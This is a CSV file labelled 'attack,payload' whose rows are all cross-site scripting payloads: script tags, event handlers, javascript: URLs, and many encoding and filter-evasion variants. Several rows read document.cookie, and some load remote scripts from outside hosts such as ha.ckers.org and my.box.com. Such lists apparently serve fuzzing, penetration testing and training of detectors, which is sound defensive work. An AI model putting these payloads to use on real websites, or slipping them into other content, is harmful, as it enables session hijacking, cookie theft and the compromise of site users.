﻿attack,payload
xss,"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search"
xss,"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
xss,"';alert(String&#46;fromCharCode(88,83,83))//\';alert(String&#46;fromCharCode(88,83,83))//\"";alert(String&#46;fromCharCode(88,83,83))//\\"";alert(String&#46;fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\""&gt;'&gt;&lt;SCRIPT&gt;alert(String&#46;fromCharCode(88,83,83))&lt;/SCRIPT&gt;"
xss,"'';!--""<XSS>=&{()}"
xss,"'';!--\""&lt;XSS&gt;=&{()}"
xss,‘; alert(1);
xss,‘; alert(document.cookie); var foo=’
xss,"‘;alert(String.fromCharCode(88,83,83))//’;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//–></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
xss,‘)alert(1);//
xss,"""><img src=x onerror=window.open('https://www.google.com/');>"
xss,"""><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>"
xss,“><<script>alert(document.cookie);//<</script>
xss,“><s”%2b”cript>alert(document.cookie)</script>
xss,“><s”%2b”cript>alert(document.cookie)</script>
xss,“><script>alert(“XSS”)</script>
xss,“><ScRiPt>alert(document.cookie)</script>
xss,"/*iframe/src*/<iframe/src=""<iframe/src=@""/onload=prompt(1) /*iframe/src*/>"
xss,//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
xss,//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
xss,"\"";alert('XSS');//"
xss,"\\"";alert('XSS');//"
xss,\u003c
xss,\u003C
xss,\x3c
xss,\x3C
xss,"&#00;</form><input type&#61;""date"" onfocus=""alert(1)"">"
xss,&#0000060
xss,&#000060
xss,&#00060
xss,&#0060
xss,&#060
xss,&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
xss,&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
xss,&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
xss,&#60
xss,&#x000003c
xss,&#X000003c
xss,&#x000003C
xss,&#X000003C
xss,&#x000003c;
xss,&#X000003c;
xss,&#x000003C;
xss,&#X000003C;
xss,&#x00003c
xss,&#X00003c
xss,&#x00003C
xss,&#X00003C
xss,&#x00003c;
xss,&#X00003c;
xss,&#x00003C;
xss,&#X00003C;
xss,&#x0003c
xss,&#X0003c
xss,&#x0003C
xss,&#X0003C
xss,&#x0003c;
xss,&#X0003c;
xss,&#x0003C;
xss,&#X0003C;
xss,&#x003c
xss,&#X003c
xss,&#x003C
xss,&#X003C
xss,&#x003c;
xss,&#X003c;
xss,&#x003C;
xss,&#X003C;
xss,&#x03c
xss,&#X03c
xss,&#x03C
xss,&#X03C
xss,&#x03c;
xss,&#X03c;
xss,&#x03C;
xss,&#X03C;
xss,&#x3c
xss,&#X3c
xss,&#x3C
xss,&#X3C
xss,&#x3c;
xss,&#X3c;
xss,&#x3C;
xss,&#X3C;
xss,&lt
xss,&LT
xss,&lt;
xss,&lt;
xss,&LT;
xss,&lt;
xss,&lt;!--&#91;if gte IE 4&#93;&gt;
xss,"&lt;!--#exec cmd=\""/bin/echo '&lt;SCR'\""--&gt;&lt;!--#exec cmd=\""/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\""--&gt;"
xss,&lt;!&#91;endif&#93;--&gt;
xss,&lt;? echo('&lt;SCR)';
xss,"&lt;?import namespace=\""t\"" implementation=\""#default#time2\""&gt;"
xss,"&lt;?xml&#58;namespace prefix=\""t\"" ns=\""urn&#58;schemas-microsoft-com&#58;time\""&gt;"
xss,&lt;/BODY&gt;&lt;/HTML&gt;
xss,&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
xss,"&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\""XSS\"");&lt;/SCRIPT&gt;"
xss,"&lt;&lt;SCRIPT&gt;alert(\""XSS\"");//&lt;&lt;/SCRIPT&gt;"
xss,"&lt;A HREF=\""//google\""&gt;XSS&lt;/A&gt;"
xss,"&lt;A HREF=\""//www&#46;google&#46;com/\""&gt;XSS&lt;/A&gt;"
xss,"&lt;A HREF=\""htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\""&gt;XSS&lt;/A&gt;"
xss,"&lt;A HREF=\""http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\""&gt;XSS&lt;/A&gt;"
xss,"&lt;A HREF=\""http&#58;//0102&#46;0146&#46;0007&#46;00000223/\""&gt;XSS&lt;/A&gt;"
xss,"&lt;A HREF=\""http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\""&gt;XSS&lt;/A&gt;"
xss,"&lt;A HREF=\""http&#58;//1113982867/\""&gt;XSS&lt;/A&gt;"
xss,"&lt;A HREF=\""http&#58;//66&#46;102&#46;7&#46;147/\""&gt;XSS&lt;/A&gt;"
xss,"&lt;A HREF=\""http&#58;//google&#46;com/\""&gt;XSS&lt;/A&gt;"
xss,"&lt;A HREF=\""http&#58;//google&#58;ha&#46;ckers&#46;org\""&gt;XSS&lt;/A&gt;"
xss,"&lt;A HREF=\""http&#58;//ha&#46;ckers&#46;org@google\""&gt;XSS&lt;/A&gt;"
xss,"&lt;A HREF=\""http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\""&gt;XSS&lt;/A&gt;"
xss,"&lt;A HREF=\""http&#58;//www&#46;google&#46;com&#46;/\""&gt;XSS&lt;/A&gt;"
xss,"&lt;A HREF=\""javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\""&gt;XSS&lt;/A&gt;"
xss,"&lt;BASE HREF=\""javascript&#058;alert('XSS');//\""&gt;"
xss,"&lt;BGSOUND SRC=\""javascript&#058;alert('XSS');\""&gt;"
xss,"&lt;BODY BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;"
xss,"&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=alert(\""XSS\"")&gt;"
xss,&lt;BODY ONLOAD=alert('XSS')&gt;
xss,"&lt;BR SIZE=\""&{alert('XSS')}\""&gt;"
xss,"&lt;DIV STYLE=\""background-image&#58; url(javascript&#058;alert('XSS'))\""&gt;"
xss,"&lt;DIV STYLE=\""background-image&#58; url(javascript&#058;alert('XSS'))\""&gt;"
xss,"&lt;DIV STYLE=\""background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\""&gt;"
xss,"&lt;DIV STYLE=\""width&#58; expression(alert('XSS'));\""&gt;"
xss,"&lt;EMBED SRC=\""data&#58;image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\"" type=\""image/svg+xml\"" AllowScriptAccess=\""always\""&gt;&lt;/EMBED&gt;"
xss,"&lt;EMBED SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;swf\"" AllowScriptAccess=\""always\""&gt;&lt;/EMBED&gt;"
xss,"&lt;FRAMESET&gt;&lt;FRAME SRC=\""javascript&#058;alert('XSS');\""&gt;&lt;/FRAMESET&gt;"
xss,"&lt;HEAD&gt;&lt;META HTTP-EQUIV=\""CONTENT-TYPE\"" CONTENT=\""text/html; charset=UTF-7\""&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-"
xss,"&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\""xss\"" implementation=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\""&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;"
xss,&lt;HTML&gt;&lt;BODY&gt;
xss,"&lt;IFRAME SRC=\""javascript&#058;alert('XSS');\""&gt;&lt;/IFRAME&gt;"
xss,&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;
xss,"&lt;IMG \""\""\""&gt;&lt;SCRIPT&gt;alert(\""XSS\"")&lt;/SCRIPT&gt;\""&gt;"
xss,"&lt;IMG DYNSRC=\""javascript&#058;alert('XSS')\""&gt;"
xss,"&lt;IMG LOWSRC=\""javascript&#058;alert('XSS')\""&gt;"
xss,"&lt;IMG SRC='vbscript&#058;msgbox(\""XSS\"")'&gt;"
xss,"&lt;IMG SRC=\"" javascript&#058;alert('XSS');\""&gt;"
xss,"&lt;IMG SRC=\""http&#58;//www&#46;thesiteyouareon&#46;com/somecommand&#46;php?somevariables=maliciouscode\""&gt;"
xss,"&lt;IMG SRC=\""jav&#x09;ascript&#058;alert('XSS');\""&gt;"
xss,"&lt;IMG SRC=\""jav&#x0A;ascript&#058;alert('XSS');\""&gt;"
xss,"&lt;IMG SRC=\""jav&#x0D;ascript&#058;alert('XSS');\""&gt;"
xss,"&lt;IMG SRC=\""javascript&#058;alert('XSS');\""&gt;"
xss,"&lt;IMG SRC=\""javascript&#058;alert('XSS')\"""
xss,"&lt;IMG SRC=\""livescript&#058;&#91;code&#93;\""&gt;"
xss,"&lt;IMG SRC=\""mocha&#58;&#91;code&#93;\""&gt;"
xss,&lt;IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041&gt;
xss,&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;
xss,"&lt;IMG SRC=`javascript&#058;alert(\""RSnake says, 'XSS'\"")`&gt;"
xss,&lt;IMG SRC=javascript&#058;alert('XSS')&gt;
xss,&lt;IMG SRC=JaVaScRiPt&#058;alert('XSS')&gt;
xss,&lt;IMG SRC=javascript&#058;alert('XSS')&gt;
xss,&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;
xss,"&lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;"
xss,"&lt;IMG STYLE=\""xss&#58;expr/*XSS*/ession(alert('XSS'))\""&gt;"
xss,"&lt;INPUT TYPE=\""IMAGE\"" SRC=\""javascript&#058;alert('XSS');\""&gt;"
xss,"&lt;LAYER SRC=\""http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\""&gt;&lt;/LAYER&gt;"
xss,"&lt;LINK REL=\""stylesheet\"" HREF=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;css\""&gt;"
xss,"&lt;LINK REL=\""stylesheet\"" HREF=\""javascript&#058;alert('XSS');\""&gt;"
xss,"&lt;META HTTP-EQUIV=\""Link\"" Content=\""&lt;http&#58;//ha&#46;ckers&#46;org/xss&#46;css&gt;; REL=stylesheet\""&gt;"
xss,"&lt;META HTTP-EQUIV=\""refresh\"" CONTENT=\""0; URL=http&#58;//;URL=javascript&#058;alert('XSS');\"""
xss,"&lt;META HTTP-EQUIV=\""refresh\"" CONTENT=\""0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\""&gt;"
xss,"&lt;META HTTP-EQUIV=\""refresh\"" CONTENT=\""0;url=javascript&#058;alert('XSS');\""&gt;"
xss,"&lt;META HTTP-EQUIV=\""Set-Cookie\"" Content=\""USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\""&gt;"
xss,&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert('XSS')&gt;&lt;/OBJECT&gt;
xss,"&lt;OBJECT TYPE=\""text/x-scriptlet\"" DATA=\""http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\""&gt;&lt;/OBJECT&gt;"
xss,"&lt;SCRIPT \""a='&gt;'\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;"
xss,"&lt;SCRIPT =\""&gt;\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;"
xss,"&lt;SCRIPT a=\""&gt;'&gt;\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;"
xss,"&lt;SCRIPT a=\""&gt;\"" '' SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;"
xss,"&lt;SCRIPT a=\""&gt;\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;"
xss,"&lt;SCRIPT a=`&gt;` SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;"
xss,&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;
xss,"&lt;SCRIPT SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\""&gt;&lt;/SCRIPT&gt;"
xss,&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;
xss,&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;
xss,"&lt;SCRIPT/SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;"
xss,"&lt;SCRIPT/XSS SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;"
xss,&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;
xss,&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;
xss,"&lt;SCRIPT&gt;document&#46;write(\""&lt;SCRI\"");&lt;/SCRIPT&gt;PT SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;"
xss,"&lt;SPAN DATASRC=\""#xss\"" DATAFLD=\""B\"" DATAFORMATAS=\""HTML\""&gt;&lt;/SPAN&gt;"
xss,&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
xss,"&lt;STYLE type=\""text/css\""&gt;BODY{background&#58;url(\""javascript&#058;alert('XSS')\"")}&lt;/STYLE&gt;"
xss,"&lt;STYLE TYPE=\""text/javascript\""&gt;alert('XSS');&lt;/STYLE&gt;"
xss,"&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(\""XSS\"")';&lt;/STYLE&gt;"
xss,&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;
xss,"&lt;STYLE&gt;&#46;XSS{background-image&#58;url(\""javascript&#058;alert('XSS')\"");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;"
xss,"&lt;STYLE&gt;BODY{-moz-binding&#58;url(\""http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\"")}&lt;/STYLE&gt;"
xss,"&lt;STYLE&gt;li {list-style-image&#58; url(\""javascript&#058;alert('XSS')\"");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS"
xss,"&lt;t&#58;set attributeName=\""innerHTML\"" to=\""XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\""&gt;"
xss,"&lt;TABLE BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;"
xss,"&lt;TABLE&gt;&lt;TD BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;"
xss,"&lt;XML ID=\""xss\""&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\""javas&lt;!-- --&gt;cript&#58;alert('XSS')\""&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;"
xss,"&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\""javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('XSS');\""&gt;&#93;&#93;&gt;"
xss,"&lt;XML SRC=\""xsstest&#46;xml\"" ID=I&gt;&lt;/XML&gt;"
xss,"&lt;XSS STYLE=\""behavior&#58; url(xss&#46;htc);\""&gt;"
xss,"&lt;XSS STYLE=\""xss&#58;expression(alert('XSS'))\""&gt;"
xss,%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
xss,%253cscript%253ealert(1)%253c/script%253e
xss,%253cscript%253ealert(document.cookie)%253c/script%253e
xss,%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
xss,%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
xss,%3C
xss,+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
xss,+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
xss,<--`<img/src=` onerror=alert(1)> --!>
xss,"<! foo=""[[[Inception]]""><x foo=""]foo><script>alert(1)</script>"">"
xss,"<! foo=""><script>alert(1)</script>"">"
xss,"<! foo=""><script>alert(1)</script>"">"
xss,"<!--<img src=""--><img src=x onerror=alert(123)//"">"
xss,"<!--<img src=""--><img src=x onerror=alert(XSS)//"">"
xss,"<![><img src=""]><img src=x onerror=alert(XSS)//"">"
xss,"<? foo=""><script>alert(1)</script>"">"
xss,"<? foo=""><script>alert(1)</script>"">"
xss,"<? foo=""><x foo='?><script>alert(1)</script>'>"">"
xss,"<""';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
xss,"<""';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
xss,"</ foo=""><script>alert(1)</script>"">"
xss,"</ foo=""><script>alert(1)</script>"">"
xss,<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
xss,</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
xss,</plaintext\></|\><plaintext/onmouseover=prompt(1)
xss,"</script><img/*%00/src=""worksinchrome&colon;prompt&#x28;1&#x29;""/%00*/onerror='eval(src)'>"
xss,</script><script >alert(document.cookie)</script>
xss,</script><script>alert(1)</script>
xss,</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
xss,</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
xss,"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>"
xss,"<% foo><x foo=""%><script>alert(123)</script>"">"
xss,<%<!--'%><script>alert(1);</script -->
xss,"<<SCRIPT>alert(""XSS"");//<</SCRIPT>"
xss,"<<SCRIPT>alert(""XSS"");//<</SCRIPT>"
xss,<<SCRIPT>alert(“XSS”);//<</SCRIPT>
xss,<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
xss,"<a href=""data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""&#09;&#10;&#11;>X</a"
xss,"<a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>"">X</a"
xss,"<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click Me</a>"
xss,"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>"
xss,"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>"
xss,"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>"
xss,<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
xss,"<a/href=""javascript:&#13; javascript:prompt(1)""><input type=""X"">"
xss,"<a&#32;href&#61;&#91;&#00;&#93;""&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;"">XYZ</a"
xss,<audio src=1 onerror=alert(1)>
xss,<BODY BACKGROUND=”javascript:alert(‘XSS’)”>
xss,<BODY ONLOAD=alert('hellox worldss')>
xss,<BODY ONLOAD=alert(‘XSS’)>
xss,<BODY ONLOAD=alert(’XSS’)>
xss,<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
xss,<body/onload=&lt;!--&gt;&#10alert(1)>
xss,<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
xss,"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">"
xss,"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">"
xss,"<div style=""font-family:'foo&#10;;color:red;';"">LOL"
xss,"<DIV STYLE=""width: expression(alert('XSS'));"">"
xss,"<div style=""xg-p:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>"
xss,"<div/onmouseover='alert(1)'> style=""x:"">"
xss,"<div/style=""width:expression(confirm(1))"">X</div> {IE7}"
xss,"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>"
xss,"<EMBED SRC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""></EMBED>"
xss,"<embed src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">"
xss,"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">"
xss,"<EMBED SRC=""http://ha.ckers.org/xss.swf"" AllowScriptAccess=""always""></EMBED>"
xss,"<embed src=""javascript:alert(1)"">"
xss,"<form id=""test"" /><button form=""test"" formaction=""javascript:alert(123)"">TESTHTML5FORMACTION"
xss,"<form><a href=""javascript:\u0061lert&#x28;1&#x29;"">X"
xss,"<form><button formaction=""javascript:alert(123)"">crosssitespt"
xss,"<form><button formaction=""javascript:alert(XSS)"">lol"
xss,<form><button formaction=javascript&colon;alert(1)>CLICKME
xss,"<form><iframe &#09;&#10;&#11; src=""javascript&#58;alert(1)""&#11;&#10;&#09;;>"
xss,"<form><isindex formaction=""javascript&colon;confirm(1)"""
xss,<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
xss,<frameset onload=alert(123)>
xss,"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>"
xss,<h1><font color=blue>hellox worldss</h1>
xss,"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;""></BODY></HTML>"
xss,"<iframe %00 src=""&Tab;javascript:prompt(1)&Tab;""%00>"
xss,"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>"
xss,"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>"
xss,"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>"
xss,<iframe src=http://ha.ckers.org/scriptlet.html <
xss,<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
xss,<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
xss,<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
xss,<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
xss,"<iframe style=""xg-p:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">"
xss,"<iframe xmlns=""#"" src=""javascript:alert(1)""></iframe>"
xss,<iframe/%00/ src=javaSCRIPT&colon;alert(1)
xss,<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
xss,<iframe/onreadystatechange=alert(1)
xss,<iframe/src \/\/onload = prompt(1)
xss,"<iframe/src=""data:text/html,<svg &#111;&#110;load=alert(1)>"">"
xss,"<iframe/src=""data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="">"
xss,"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">"
xss,<IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>”>
xss,<img src ?itworksonchrome?\/onerror = alert(1)
xss,"<IMG SRC="" &#14; javascript:alert('XSS');"">"
xss,"<img src=""/"" =_="" title=""onerror='prompt(1)'"">"
xss,"<img src=""javascript:alert('XSS');"">"
xss,"<IMG SRC=""javascript:alert('XSS');"">"
xss,<IMG SRC=”jav ascript:alert(‘XSS’);”>
xss,<IMG SRC=”jav&#x09;ascript:alert(‘XSS’);”>
xss,<IMG SRC=”javascript:alert(‘XSS’);”>
xss,<IMG SRC=”javascript:alert(‘XSS’)”
